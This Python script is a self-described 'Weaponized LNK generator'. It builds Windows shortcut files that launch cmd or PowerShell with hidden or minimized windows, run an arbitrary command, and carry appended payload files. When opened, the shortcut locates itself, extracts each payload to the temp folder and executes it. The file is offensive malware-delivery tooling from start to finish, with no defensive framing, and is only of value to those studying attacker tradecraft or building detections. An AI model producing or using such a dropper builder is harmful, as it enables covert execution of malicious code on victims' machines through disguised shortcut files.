import os
import argparse
import win32com.client
'''
Limitations:
- If attachments are used, the LNK will call powershell.
'''

'''
Dictionary to store placeholders and their respective values. We have a generic placeholder that will be number 0. Then each attachment command has 2 placeholders, that will be indexed like this:
- 00001 -> Placeholder number 1 for attachment 0
- 00002 -> Placeholder number 2 for attachment 0
- 00003 -> Placeholder number 0 for attachment 1
- 00004 -> Placeholder number 1 for attachment 1
Ando so on...
Like (Placeholder num+attNum*placeholders_per_attachment)

The attachment are numbered starting from 0.
'''
plh_dic = {}

current_dir = os.getcwd()

plh_per_attachment = 2

def create_lnk_file(path, icon, interpreter, arguments, delete_existing = False):
    try:
        if (delete_existing and os.path.exists(path)):
            os.remove(path)
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(path)
        shortcut.TargetPath = interpreter
        shortcut.IconLocation = icon
        shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
        shortcut.Arguments = arguments
        shortcut.save()
    except Exception as e:
        print(f"Error occured: {e}")

def append_file_to_file(file_destiny, file_to_append):
    with open(file_destiny, "ab") as original_file, open(file_to_append, "rb") as appended_file:
        original_file.write(appended_file.read())


def prepare_arguments(interpreter, command, attachments):
    command_string = r" powershell -windowstyle hidden "
    
    # TODO: Think if command is added or not if we have attachments
    command_string = command_string + command + ';'
    
    command_string += r"$dir = Get-Location; if($dir -Match 'System32' -or $dir -Match 'Program Files') { $dir = '%temp'}; $lnkpath = Get-ChildItem -Path $dir -Recurse *.lnk ^| where-object { $_.length -eq 0x00000000 } ^| Select-Object -ExpandProperty FullName;"
    plh_dic['00000000'] = None # Add generic placeholder
    att_num = 0
    for attachment in attachments:                
        attFileName= os.path.basename(attachment)
        # Store the index of the placeholder,Format them in the string with the appropiate lenght of number (8 numbers)
        plh_index = att_num*plh_per_attachment + 1
        attachment_string = fr"$att{att_num}File = gc $lnkpath -Encoding Byte -TotalCount {plh_index:08d} -ReadCount {plh_index:08d}; $att{att_num}Path = '%temp%\{attFileName}'; sc $att{att_num}Path ([byte[]]($att{att_num}File ^| select -Skip {plh_index+1:08d})) -Encoding Byte; ^& $att{att_num}Path;"
        
        # Store Placeholders in dictionary
        plh_dic[f"{plh_index:08d}"] = None
        plh_dic[f"{plh_index+1:08d}"] = None
        att_num += 1 

        command_string = command_string + ' ' + attachment_string

    return command_string

'''
Compute sizes of each placeholder. 0000000 Is the total size of everything, and for each attachment we need to store:
- Size of all previous elements + size of attachment in frist placeholder
- Size of all previous elements in second placeholder
'''
def compute_sizes(lnk_path, attachments):
    lnk_size = os.path.getsize(lnk_path)
    previous_elem_size = lnk_size
    for i in range(len(attachments)): # i is the index of attachment
        plh_index = i*plh_per_attachment + 1
        att_size = os.path.getsize(attachments[i])
        plh_dic[f"{plh_index:08d}"] = f'{(previous_elem_size + att_size):08d}'
        plh_dic[f"{plh_index+1:08d}"] = f'{(previous_elem_size):08d}'

        previous_elem_size+= att_size

    # Fill the first element with total size we will have at the end of the loop
    plh_dic["00000000"] = f'{previous_elem_size:08x}'

'''
Iterate over the placeholders 
'''
def overwrite_plh_with_sizes(command):
    for key, value in plh_dic.items():
        command = command.replace(key, value)

    return command

def main():
    # Parse command line arguments and options
    parser = argparse.ArgumentParser(description="Weaponized LNK generator")
    parser.add_argument("lnk_file", help="Name of the LNK to generate")
    parser.add_argument("-r", "--interpreter", default="cmd", help="Interpreter to use cmd or powershell. Default: cmd")
    parser.add_argument("-c", "--command", default='', help="Command arguments to execute")
    parser.add_argument("-i", "--icon", help="Icon index in C:\Windows\System32\shell32.dll", default=0)
    parser.add_argument("-a", "--attachments", action="append", help="Path to files to append to LNK, files will be extracted and opened on LNK execution. Repeat argument for more files") # '''nargs="+",''' 
    
    args = parser.parse_args()
    
    # Configure and create LNK
    if (args.interpreter == "cmd"):
        lnk_interpreter = r"%systemroot%\SysWOW64\cmd.exe" 
        lnk_arguments = r"/c"
    elif (args.interpreter == "powershell"):
        if (args.attachments):
            print("Error, for the moment powershell cannot be used as interpreter with the attachment generator. Please use CMD")
            exit(1)
        lnk_interpreter = r"%windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" 
        lnk_arguments = r"iex"
    else:
        print("Invalid interpreter provided, exiting...")
        exit()

    lnk_name = args.lnk_file
    lnk_path = current_dir + '\\' + lnk_name
    lnk_icon = r"%systemroot%\system32\shell32.dll," + str(args.icon)
    
    if not args.attachments:
        lnk_arguments = lnk_arguments + ' ' + args.command
    else:
        for attachment in args.attachments:
            if not os.path.isfile(attachment):
                print(f"Error attachment {attachment} not found, exiting...")
                exit()
                
        lnk_arguments = lnk_arguments + ' ' + prepare_arguments(args.interpreter, args.command, args.attachments) 
        
        # Generate LNK file with placeholders.
        create_lnk_file(lnk_path, lnk_icon, lnk_interpreter, lnk_arguments)

        # Compute sizes of each placeholder
        compute_sizes(lnk_path, args.attachments)

        # Overwrite placeholders with real sizes
        lnk_arguments = overwrite_plh_with_sizes(lnk_arguments)
        
    # Write final LNK file 
    create_lnk_file(lnk_path, lnk_icon, lnk_interpreter, lnk_arguments, True)
    
    # Append attachments to file if there is any
    if args.attachments:
        for att in args.attachments:
            append_file_to_file(lnk_path, att)
                

if __name__ == '__main__':
    main()